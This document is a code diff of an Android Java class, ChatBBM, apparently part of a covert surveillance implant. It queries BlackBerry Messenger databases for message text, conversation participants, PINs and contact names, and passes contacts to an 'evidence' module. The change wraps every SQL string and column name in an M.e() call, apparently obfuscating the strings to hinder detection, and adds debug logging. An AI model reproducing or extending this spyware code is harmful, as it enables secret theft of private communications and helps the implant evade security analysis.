@@ -8,6 +8,7 @@ import com.android.dvci.db.RecordGroupsVisitor;
 import com.android.dvci.db.RecordVisitor;
 import com.android.dvci.module.ModuleAddressBook;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.StringUtils;
 import com.android.mm.M;
 
 import org.xml.sax.SAXException;
@@ -182,7 +183,7 @@ public class ChatBBM extends SubModuleChat {
 			}
 		};
 
-		helper.traverseRawQuery("SELECT count(name) FROM sqlite_master WHERE type='table' and name = 'UserPins'", null, visitor);
+		helper.traverseRawQuery(M.e("SELECT count(name) FROM sqlite_master WHERE type='table' and name = 'UserPins'"), null, visitor);
 		return type[0];
 	}
 
@@ -227,16 +228,8 @@ public class ChatBBM extends SubModuleChat {
 		String timestamp = Long.toString(this.lastBBM / 1000);
 		final ChatGroups groups = new ChatGroups();
 		RecordGroupsVisitor visitorGrp = new RecordGroupsVisitor(groups,"T.TIMESTAMP", true);
-		String[] sql = new String[]{"SELECT C.CONVERSATIONID,P.USERID,U.DISPLAYNAME,U.PIN FROM PARTICIPANTS AS P " +
-				"JOIN CONVERSATIONS AS C ON C.CONVERSATIONID = P.CONVERSATIONID " +
-				"JOIN USERS AS U ON U.USERID = P.USERID " +
-				"WHERE C.MESSAGETIMESTAMP > ?",
-				"SELECT C.CONVERSATIONID,P.USERID,U.DISPLAYNAME,S.PIN FROM PARTICIPANTS AS P " +
-						"JOIN CONVERSATIONS AS C ON C.CONVERSATIONID = P.CONVERSATIONID " +
-						"JOIN USERS AS U ON U.USERID = P.USERID " +
-						"JOIN USERPINS AS S ON U.USERID = S.USERID " +
-						"WHERE C.MESSAGETIMESTAMP > ?"
-				};
+		String[] sql = new String[]{ M.e("SELECT C.CONVERSATIONID,P.USERID,U.DISPLAYNAME,U.PIN FROM PARTICIPANTS AS P JOIN CONVERSATIONS AS C ON C.CONVERSATIONID = P.CONVERSATIONID JOIN USERS AS U ON U.USERID = P.USERID WHERE C.MESSAGETIMESTAMP > ?"),
+				M.e("SELECT C.CONVERSATIONID,P.USERID,U.DISPLAYNAME,S.PIN FROM PARTICIPANTS AS P JOIN CONVERSATIONS AS C ON C.CONVERSATIONID = P.CONVERSATIONID JOIN USERS AS U ON U.USERID = P.USERID JOIN USERPINS AS S ON U.USERID = S.USERID WHERE C.MESSAGETIMESTAMP > ?")	};
 
 		helper.traverseRawQuery(sql[version], new String[]{timestamp}, visitorGrp);
 		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
@@ -259,7 +252,7 @@ public class ChatBBM extends SubModuleChat {
 		final String me_number =me.number;
 		final String me_name = me.name;
 
-		RecordVisitor visitorMsg = new RecordVisitor(null, null, "T.TIMESTAMP") {
+		RecordVisitor visitorMsg = new RecordVisitor(null, null, M.e("T.TIMESTAMP")) {
 			@Override
 			public long cursor(Cursor cursor) {
 				String groupid = cursor.getString(0);
@@ -293,13 +286,7 @@ public class ChatBBM extends SubModuleChat {
 			}
 		};
 
-		String sqlmsg ="SELECT C.CONVERSATIONID,T.TIMESTAMP,T.CONTENT, U.USERID\n" +
-				"FROM TEXTMESSAGES AS T\n" +
-				"JOIN CONVERSATIONS AS C ON T.CONVERSATIONID = C.CONVERSATIONID\n" +
-				"JOIN PARTICIPANTS AS P ON P.PARTICIPANTID = T.PARTICIPANTID\n" +
-				"JOIN USERS AS U ON U.USERID = P.USERID\n" +
-				"WHERE T.TIMESTAMP>?\n" +
-				"AND C.CONVERSATIONID=?\n";
+		String sqlmsg =M.e("SELECT C.CONVERSATIONID,T.TIMESTAMP,T.CONTENT, U.USERID FROM TEXTMESSAGES AS T JOIN CONVERSATIONS AS C ON T.CONVERSATIONID = C.CONVERSATIONID JOIN PARTICIPANTS AS P ON P.PARTICIPANTID = T.PARTICIPANTID JOIN USERS AS U ON U.USERID = P.USERID WHERE T.TIMESTAMP>? AND C.CONVERSATIONID=?");
 
 		long maxid = 0;
 		for( String group: groups.getAllGroups() ){
@@ -339,7 +326,7 @@ public class ChatBBM extends SubModuleChat {
 
 	private void readAddressContactsUserPins(GenericSqliteHelper helper) throws SAXException, IOException, ParserConfigurationException {
 
-		String sql = "SELECT u.userid,pin,displayname FROM Users as u JOIN UserPins as p on u.UserId=p.UserId";
+		String sql = M.e("SELECT u.userid,pin,displayname FROM Users as u JOIN UserPins as p on u.UserId=p.UserId");
 		RecordVisitor visitor = new RecordVisitor() {
 			@Override
 			public long cursor(Cursor cursor) {
@@ -359,7 +346,7 @@ public class ChatBBM extends SubModuleChat {
 
 	private void readAddressContactsUsers(GenericSqliteHelper helper) throws SAXException, IOException, ParserConfigurationException {
 
-		RecordVisitor visitor = new RecordVisitor(new String[]{"userid", "pin", "displayname"}, null) {
+		RecordVisitor visitor = new RecordVisitor(StringUtils.split(M.e("userid,pin,displayname")), null) {
 			@Override
 			public long cursor(Cursor cursor) {
 				int userid = cursor.getInt(0);
@@ -367,6 +354,9 @@ public class ChatBBM extends SubModuleChat {
 				String name = cursor.getString(2).trim();
 
 				Contact contact = new Contact(Integer.toString(userid), name, name, pin);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (cursor), contact: " + contact);
+				}
 				ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.BBM, contact);
 
 				return userid;
@@ -378,7 +368,7 @@ public class ChatBBM extends SubModuleChat {
 
 	private void readLocalContact(GenericSqliteHelper helper) {
 
-		String sql = "SELECT  p.UserId, p.Pin,  u.DisplayName FROM Profile as p JOIN Users as u on p.UserId = u.UserId";
+		String sql = M.e("SELECT  p.UserId, p.Pin,  u.DisplayName FROM Profile as p JOIN Users as u on p.UserId = u.UserId");
 		account = new Account();
 
 		RecordVisitor visitor = new RecordVisitor(null, null) {
